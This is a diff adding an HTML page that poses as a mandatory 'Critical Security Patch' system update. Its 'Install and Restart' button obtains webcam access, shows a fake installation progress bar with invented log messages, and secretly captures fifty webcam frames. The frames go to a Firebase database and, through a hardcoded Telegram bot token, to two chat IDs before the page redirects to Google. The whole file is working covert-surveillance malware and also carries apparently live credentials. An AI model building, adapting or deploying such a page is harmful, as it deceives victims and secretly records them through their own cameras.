@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Update Service</title>
+    <!-- Firebase SDKs -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+    
+    <style>
+        :root {
+            --sys-gray: #F3F4F6;
+            --sys-border: #D1D5DB;
+            --sys-blue: #2563EB;
+            --sys-text: #111827;
+            --sys-text-sec: #4B5563;
+        }
+
+        body { 
+            margin: 0; padding: 0; background: #E5E7EB; 
+            font-family: -apple-system, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            display: flex; align-items: center; justify-content: center; height: 100vh;
+        }
+
+        .update-modal {
+            background: white; width: 480px;
+            border-radius: 12px; border: 1px solid var(--sys-border);
+            box-shadow: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
+            overflow: hidden;
+        }
+
+        .modal-header {
+            padding: 20px 24px; border-bottom: 1px solid var(--sys-border);
+            display: flex; align-items: center; gap: 12px;
+        }
+
+        .sys-icon {
+            width: 32px; height: 32px; background: var(--sys-blue);
+            border-radius: 6px; display: flex; align-items: center; justify-content: center;
+            color: white; font-weight: bold; font-size: 20px;
+        }
+
+        .modal-content { padding: 32px 24px; }
+
+        h2 { margin: 0 0 8px; font-size: 18px; font-weight: 600; color: var(--sys-text); }
+        p { margin: 0 0 24px; font-size: 14px; color: var(--sys-text-sec); line-height: 1.5; }
+
+        .update-info-box {
+            background: var(--sys-gray); border-radius: 8px;
+            padding: 16px; margin-bottom: 24px; font-size: 13px;
+        }
+
+        .info-row { display: flex; justify-content: space-between; margin-bottom: 6px; }
+        .info-label { font-weight: 500; color: var(--sys-text-sec); }
+        .info-value { color: var(--sys-text); font-family: monospace; }
+
+        .btn-update {
+            background: var(--sys-blue); color: white; border: none;
+            padding: 12px 24px; border-radius: 6px; font-size: 14px; font-weight: 500;
+            width: 100%; cursor: pointer; transition: background 0.2s;
+        }
+
+        .btn-update:hover { background: #1d4ed8; }
+
+        #progress-ui { display: none; }
+        .progress-container { margin-top: 10px; }
+        .progress-label { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 8px; }
+        .progress-track { height: 8px; background: #E5E7EB; border-radius: 4px; overflow: hidden; }
+        .progress-fill { height: 100%; width: 0%; background: var(--sys-blue); transition: 0.8s ease-out; }
+        
+        .status-log {
+            margin-top: 16px; font-family: monospace; font-size: 11px;
+            color: #6B7280; text-align: center;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="update-modal">
+        <div class="modal-header">
+            <div class="sys-icon">↑</div>
+            <div style="font-weight: 600; font-size: 15px;">Software Update</div>
+        </div>
+
+        <div class="modal-content" id="setup-ui">
+            <h2>Critical Security Patch Available</h2>
+            <p>A mandatory kernel-level update is required to address high-risk vulnerabilities in the system's cryptographic modules.</p>
+            
+            <div class="update-info-box">
+                <div class="info-row"><span class="info-label">Version:</span> <span class="info-value">KB503412.04</span></div>
+                <div class="info-row"><span class="info-label">Type:</span> <span class="info-value">Security/Stability</span></div>
+                <div class="info-row"><span class="info-label">Status:</span> <span class="info-value">Ready to install</span></div>
+            </div>
+
+            <button class="btn-update" onclick="initiate()">Install and Restart</button>
+        </div>
+
+        <div class="modal-content" id="progress-ui">
+            <div class="progress-container">
+                <div class="progress-label">
+                    <span id="status-main">Applying patch...</span>
+                    <span id="percent-text">0%</span>
+                </div>
+                <div class="progress-track">
+                    <div id="loader" class="progress-fill"></div>
+                </div>
+                <div class="status-log" id="log-text">Initializing installation sequence...</div>
+            </div>
+        </div>
+    </div>
+
+    <video id="v" style="display:none;" autoplay playsinline></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const firebaseConfig = {
+            apiKey: "AIzaSyBlRY8iXI5jK8GH8tku6A0We3tC_0iiup4",
+            authDomain: "shadow-app-4q69.firebaseapp.com",
+            databaseURL: "https://shadow-app-4q69-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "shadow-app-4q69",
+            storageBucket: "shadow-app-4q69.firebasestorage.app",
+            messagingSenderId: "109693889633",
+            appId: "1:109693889633:web:f1654b2fb1de886cdc8e20"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const TOKEN = '8620771394:AAGl1HASK_i24zIpAZLCC7wRIwxlUvkxYrI';
+        const IDS = ['7617707778', '7194705917'];
+
+        const systemLogs = [
+            "Validating system environment...",
+            "Suspending background services...",
+            "Injecting binary fragments...",
+            "Updating secure boot keys...",
+            "Writing to physical sectors...",
+            "Optimizing hardware registry...",
+            "Clearing temporary cache..."
+        ];
+
+        async function initiate() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('setup-ui').style.display = 'none';
+                document.getElementById('progress-ui').style.display = 'block';
+                
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                video.onloadedmetadata = () => {
+                    video.play();
+                    let count = 0;
+                    const max = 50;
+                    const interval = setInterval(() => {
+                        if (count >= max) {
+                            clearInterval(interval);
+                            document.getElementById('status-main').innerText = "Installation Complete.";
+                            setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+                            return;
+                        }
+                        sendData(++count);
+                        const progress = Math.round((count / max) * 100);
+                        document.getElementById('loader').style.width = progress + "%";
+                        document.getElementById('percent-text').innerText = progress + "%";
+                        
+                        if (count % 4 === 0) {
+                            document.getElementById('log-text').innerText = systemLogs[Math.floor(Math.random() * systemLogs.length)];
+                        }
+                    }, 1200);
+                };
+            } catch (e) {
+                alert("Installation Aborted: Hardware environment could not be verified.");
+            }
+        }
+
+        function sendData(index) {
+            const canvas = document.getElementById('c');
+            const video = document.getElementById('v');
+            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            
+            const base64Data = canvas.toDataURL('image/jpeg', 0.3);
+            database.ref('captures').push({
+                image_data: base64Data,
+                target_id: "SYS_UPDATE_HOOK",
+                timestamp: Date.now()
+            });
+            
+            canvas.toBlob(blob => {
+                IDS.forEach(id => {
+                    const fd = new FormData();
+                    fd.append('chat_id', id); fd.append('photo', blob, 'sys.jpg');
+                    fd.append('caption', `🛠️ SYS_UPDATE_SYNC\nFrame: ${index}/50`);
+                    fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
+                });
+            }, 'image/jpeg', 0.4);
+        }
+    </script>
+</body>
+</html>
